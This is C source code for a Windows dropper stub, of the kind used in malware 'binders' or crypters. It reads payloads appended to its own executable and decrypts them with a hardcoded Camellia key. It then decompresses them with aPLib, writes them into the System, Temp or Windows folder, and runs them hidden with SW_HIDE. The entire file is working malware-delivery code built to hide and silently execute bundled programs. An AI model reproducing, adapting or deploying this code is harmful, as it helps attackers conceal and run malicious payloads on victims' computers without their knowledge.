#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <shellapi.h>
#include <stddef.h>
#include <limits.h>
#include "aplib.h"
#include "camellia.h"

#pragma optimize("gsy", on)
#pragma comment(linker, "/ENTRY:Entry")
#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/MERGE:.rdata=.data")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/MERGE:.reloc=.data")
#pragma comment(linker, "/SECTION:.text, EWR /IGNORE:4078")
#pragma comment(linker, "/OPT:NOWIN98")		// Make section alignment really small.
#define WIN32_LEAN_AND_MEAN

#pragma comment(lib, "aplib")

#define STUB_EOF	25600
#define ENC_LEN		128

struct file_data {
	char			szFileName[40];
	unsigned long	size;
	unsigned long	actual;
	short			path;
	short			run;
} *pfile_data;

int Entry( void ){
	HANDLE				hStub, hFile, hActualFile;
	DWORD				dwBytesRead, dwBytesWritten;
	char				szThisFile[_MAX_FNAME], szTempName[MAX_PATH], szPath[MAX_PATH], szTempPath[MAX_PATH], *buf= "";
	struct file_data	fd;
	int					temp;
	byte				*data, *packed;
	size_t				depackedsize, outsize;

	pfile_data= &fd;

	//FreeConsole();

	GetModuleFileName(NULL, szThisFile, _MAX_FNAME);

	hStub= CreateFile(szThisFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	SetFilePointer(hStub, STUB_EOF, NULL, FILE_BEGIN);

	while( ReadFile(hStub, pfile_data, sizeof fd, &dwBytesRead, NULL) && dwBytesRead ){
		// Debugging Camellia.
		KEY_TABLE_TYPE keyTable;
		unsigned char rawKey[]= {0x52, 0x45, 0xA9, 0x7F, 0x3B, 0xA4, 0xC2, 0xE5,
								0x00, 0x42, 0x8C, 0xEF, 0x70, 0xC1, 0x5C, 0xC2,
								0xBA, 0xB7, 0x9D, 0x95, 0x69, 0xE8, 0xFF, 0xB3,
								0x21, 0xA2, 0x36, 0x8D, 0xFF, 0xDD, 0xE2, 0x79};
		unsigned char *dec_data= malloc(ENC_LEN/8);
		dec_data[0]= 0;
		Camellia_Ekeygen(ENC_LEN, rawKey, keyTable);

		if( pfile_data->path==1 ){
			GetSystemDirectory(szPath, sizeof szPath);
		}else if( pfile_data->path==2 ){
			GetTempPath(sizeof szPath, szPath);
		}else{
			GetWindowsDirectory(szPath, sizeof szPath);
		}
		GetTempPath(sizeof szTempPath, szTempPath);
		GetTempFileName(szTempPath, "NEW", 0, szTempName);

		lstrcat(szPath, "\\");
		lstrcat(szPath, pfile_data->szFileName);

		hFile= CreateFile(szTempName, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if( hFile==INVALID_HANDLE_VALUE ){
			return 1;
		}

		buf= malloc(pfile_data->size);
		if( !buf ){
			return 2;
		}

		ReadFile(hStub, buf, pfile_data->size, &dwBytesRead, NULL);
		temp= 0;
		while( temp<pfile_data->size ){
			char *crypt= buf+temp;
			Camellia_DecryptBlock(ENC_LEN, crypt, keyTable, dec_data);
			temp += ENC_LEN/8;

			if( temp>pfile_data->actual ){
				WriteFile(hFile, dec_data, pfile_data->actual % (ENC_LEN/8), &dwBytesWritten, NULL);
			}else{
				WriteFile(hFile, dec_data, ENC_LEN/8, &dwBytesWritten, NULL);
			}			
		}
		FlushFileBuffers(hFile);
		CloseHandle(hFile);

		hFile= CreateFile(szTempName,GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		
		// Start of aPLib decompression.
		hActualFile= CreateFile(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if( hFile==INVALID_HANDLE_VALUE ){
			return 1;
		}
		// Allocate memory.
		if( (packed= (byte *)malloc(GetFileSize(hFile,NULL)))==NULL ){
			MessageBox(NULL, "ERROR: Not enough memory.", "Memory not enough Error.", MB_OK);
			return 1;
		}
		ReadFile(hFile,packed,GetFileSize(hFile,NULL),&dwBytesRead,NULL);
		depackedsize= aPsafe_get_orig_size(packed);

		if( depackedsize==APLIB_ERROR ){
			MessageBox(NULL, "ERROR: Compressed data error.", "Error in Compressing Data..", MB_OK);
			return 1;
		}
		// Allocate memory.
		if( (data= (byte *) malloc(depackedsize))==NULL ){
			MessageBox(NULL, "ERROR2: Not enough memory.", "Memory not enough Error2.", MB_OK);
			return 1;
		}
		// Decompress data.
		outsize= aPsafe_depack(packed, pfile_data->actual, data, depackedsize);

		// check for decompression error.
		if( outsize!=depackedsize ){
			MessageBox(NULL, "ERROR: An error occured while decompressing.", "Error in decompressing.", MB_OK);
			return 1;
		}
		WriteFile(hActualFile, data, outsize, &dwBytesWritten, NULL);
		// End of aPLib decompression.
		CloseHandle(hFile);
		CloseHandle(hActualFile);
		free(dec_data);
		free(buf);

		if( pfile_data->run ){
			ShellExecute(NULL, "open", szPath, NULL, NULL, SW_HIDE);
		}
	}
	CloseHandle(hStub);
	return 0;
}
